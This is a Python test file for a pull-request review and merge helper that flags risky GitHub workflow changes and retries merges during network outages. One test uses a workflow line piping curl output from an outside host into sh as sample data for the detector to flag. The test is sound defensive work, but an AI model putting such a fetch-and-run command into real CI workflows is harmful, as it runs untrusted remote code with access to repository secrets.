def test_a_changed_action_or_a_file_too_big_is_never_safe():
    act = _wf_file("    - run: echo", name=".github/actions/setup/action.yml")
    assert ghmerge.check_workflows([act], {act["filename"]: READ_ONLY})["safe"] is False
    big = {"filename": WF, "status": "modified", "additions": 900, "deletions": 0}
    assert ghmerge.check_workflows([big], {WF: READ_ONLY})["safe"] is False


def test_the_card_shows_the_red_lines_and_the_phone_gets_them_as_words(tk, run, gh):
    root, tid = tk
    gh.files = [_wf_file("    timeout-minutes: 30", "      - run: curl -s https://x.dev | sh")]
    gh.whole = {WF: READ_ONLY}
    code, out, err = _ask(run, tid)
    assert code == 0, err
    pv = _q(root, tid)["card"]["preview"]
    assert pv["chips"] == [{"text": "Look at the red lines", "tone": "bad"}]
    line = "      - run: curl -s https://x.dev | sh"
    assert pv["diff"][1] == {"op": "+", "text": line, "file": WF, "risk": "download run in a shell"}
    from orch import review

    steps = review._plain_doc(pv)["steps"]
    assert (
        WF in steps and "+       - run: curl -s https://x.dev | sh  (look: download run in a shell)" in steps
    )


def test_the_card_of_a_harmless_change_says_safe_to_merge(tk, run, gh):
    root, tid = tk
    gh.files = [_wf_file("    timeout-minutes: 30")]
    gh.whole = {WF: READ_ONLY}
    code, out, err = _ask_only(run, tid)
    assert code == 0, err
    pv = _q(root, tid)["card"]["preview"]
    assert pv["chips"] == [{"text": "Safe to merge", "tone": "ok"}]
    assert pv["paras"][0].startswith("Safe to merge: ")
    assert [
        "api",
        f"repos/acme/app/contents/{WF}?ref={HEAD}",
        "-H",
        "Accept: application/vnd.github.raw",
    ] in gh.calls


def test_a_workflow_name_that_is_no_plain_path_is_not_read_whole(monkeypatch):
    calls = []

    def read(gh, args, timeout):
        calls.append(args)
        return subprocess.CompletedProcess(args, 0, READ_ONLY, "")

    odd = {"filename": ".github/workflows/a.yml?ref=main#", "status": "modified"}
    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, [odd, _wf_file("x")]) == {WF: READ_ONLY}
    assert len(calls) == 1
    many = [_wf_file("x")] + [{"filename": f"f{i}.py"} for i in range(ghmerge.COMPARE_MAX)]
    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, many) == {}


class FakeClock:
    """ghmerge's time: sleeping only moves the clock, so the retries of a few minutes take no real time."""

    def __init__(self):
        self.now, self.slept = 1000.0, []

    def monotonic(self):
        return self.now

    def sleep(self, s):
        self.slept.append(s)
        self.now += s


@pytest.fixture
def clock(monkeypatch):
    fake = FakeClock()
    monkeypatch.setattr(ghmerge, "time", fake)
    return fake


def test_refused_connection_keeps_the_card_open_and_a_second_press_merges(tk, run, gh, clock):
    """ORCH-1415: GitHub refuses the connection for the whole retry time: nothing is sent back, the card
    stays open with one plain line, and the next press merges once GitHub answers again."""
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.offline = 10_000
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 2 and ghmerge.UNREACHABLE in out + err
    assert "Merge failed" not in out + err
    q = _q(root, tid)
    assert q["answer"] is None and "decision" not in q  # the card is still open, nothing went to the helper
    assert sum(clock.slept) <= ghmerge.RETRY_FOR and len(clock.slept) >= 3  # tried again for a while
    assert gh.state == "OPEN" and gh.merges == []
    hist = " ".join(h["text"] for h in tickets.load(root, tid)["history"])
    assert "send back" not in hist.lower() and "Merge failed" not in hist
    code, out, _ = run("review", "list", "--json")
    assert "q1" in [c["key"] for c in json.loads(out)["cards"] if c["ticket"] == tid]
    gh.offline = 0  # GitHub answers again: the second press merges
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    assert gh.state == "MERGED" and len(gh.merges) == 1
    q = _q(root, tid)
    assert q["answer"] == "Merge" and q["decision"]["action"] == "approve"


def test_short_blip_is_ridden_out_in_one_press(tk, run, gh, clock):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    calls_before = len(gh.calls)
    gh.offline = 3  # the first three gh calls of the click get no answer, then GitHub is back
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    assert len(clock.slept) == 3 and gh.state == "MERGED" and len(gh.merges) == 1
    assert len(gh.calls) > calls_before
    assert _q(root, tid)["answer"] == "Merge"


def test_merge_that_landed_before_the_answer_was_lost_counts_as_merged(tk, run, gh, clock):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.lost = 1  # GitHub merged it, but its answer never came back
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    assert len(gh.merges) == 1 and len(clock.slept) == 1  # read MERGED on the next try: not merged twice
    q = _q(root, tid)
    assert q["answer"] == "Merge" and q["decision"]["action"] == "approve"
    hist = [h["text"] for h in tickets.load(root, tid)["history"]]
    assert f"The pull request was merged already on GitHub (pat-gh): {PR}" in hist


def test_gh_timeout_on_merge_is_tried_again(tk, run, gh, clock, monkeypatch):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    first = {"left": 1}

    def slow_then_fine(argv, **kw):
        if argv[1:3] == ["pr", "merge"] and first["left"]:
            first["left"] -= 1
            raise subprocess.TimeoutExpired(argv, kw.get("timeout"))
        return gh(argv, **kw)

    monkeypatch.setattr(ghmerge.subprocess, "run", slow_then_fine)
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    assert gh.state == "MERGED" and len(clock.slept) == 1


def test_a_real_refusal_is_not_retried(tk, run, gh, clock):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.merge_rc = 1
    gh.merge_err = "X Pull request acme/app#12 is not mergeable: the merge commit cannot be cleanly created."
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    assert clock.slept == [] and len(gh.merges) == 1
    assert _q(root, tid)["decision"]["action"] == "send_back"


@pytest.mark.parametrize(
    "stderr",
    [
        REFUSED_CONNECTION,
        "error connecting to api.github.com\ncheck your internet connection or https://githubstatus.com\n",
        'Get "https://api.github.com/user": dial tcp: lookup api.github.com: no such host\n',
        'Post "https://api.github.com/graphql": net/http: TLS handshake timeout\n',
        "HTTP 502: Bad Gateway (https://api.github.com/graphql)\n",
        "HTTP 503: Service Unavailable\n",
        'Post "https://api.github.com/graphql": read tcp 10.0.0.2:5000->1.2.3.4:443: connection reset',
        'Post "https://api.github.com/graphql": context deadline exceeded (Client.Timeout exceeded)\n',
    ],
)
def test_no_answer_from_github_is_told_apart(stderr):
    assert ghmerge.unreachable(subprocess.CompletedProcess([], 1, "", stderr))


@pytest.mark.parametrize(
    "stderr",
    [
        "X Pull request acme/app#12 is not mergeable: the base branch policy prohibits the merge.\n",
        "X Pull request acme/app#502 is not mergeable: the merge commit cannot be cleanly created.",
        "GraphQL: Head branch was modified. Review and try the merge again. (mergePullRequest)\n",
        'GraphQL: Required status check "tests" is expected. (mergePullRequest)\n',
        "HTTP 422: Validation Failed\n",
        "HTTP 403: Resource not accessible by integration\n",
    ],
)
def test_a_refusal_by_github_is_not_a_network_error(stderr):
    assert not ghmerge.unreachable(subprocess.CompletedProcess([], 1, "", stderr))
    assert not ghmerge.unreachable(subprocess.CompletedProcess([], 0, "", REFUSED_CONNECTION))


def test_a_blip_in_the_workflow_check_is_no_answer_on_a_merge_click(gh):
    """ORCH-1415 review: the Merge click's workflow check must not read a blip as "no workflow change" (the
    review would be skipped and GitHub's refusal would send the card back)."""
    gh.offline = 1
    with pytest.raises(ghmerge.GitHubUnreachable):
        ghmerge.workflow_check(PR, HEAD, own=True)
    gh.offline = 1
    assert ghmerge.workflow_check(PR, HEAD) is None  # the card's read when it is made: shows nothing


def test_a_merge_github_shows_late_is_not_sent_back(tk, run, gh, clock, monkeypatch):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.merge_rc, gh.merge_err = 1, "X Pull request acme/app#12 is not mergeable: it was merged already.\n"

    def merged_meanwhile(argv, **kw):
        cp = gh(argv, **kw)
        if argv[1:3] == ["pr", "merge"]:
            gh.state = "MERGED"  # an earlier try (or another click) landed; GitHub showed it only now
        return cp

    monkeypatch.setattr(ghmerge.subprocess, "run", merged_meanwhile)
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    q = _q(root, tid)
    assert q["decision"]["action"] == "approve" and clock.slept == [] and len(gh.merges) == 1


def test_a_phone_answer_tries_only_a_short_while(monkeypatch):
    seen = []
    monkeypatch.setattr(
        ghmerge, "merge", lambda url, head, **kw: seen.append(kw) or {"login": "p", "already": 0}
    )
    monkeypatch.setattr(review.tickets, "note_history", lambda *a, **k: None)
    q = {"action": {"merge": PR, "head": HEAD}, "card": {"kind": "link", "open": PR, "ok_label": "Merge"}}
    review._merge_first(None, "t1", q, {"action": "approve"}, "human:pat", "phone")
    assert seen == [{"retry_for": ghmerge.RETRY_PHONE}]
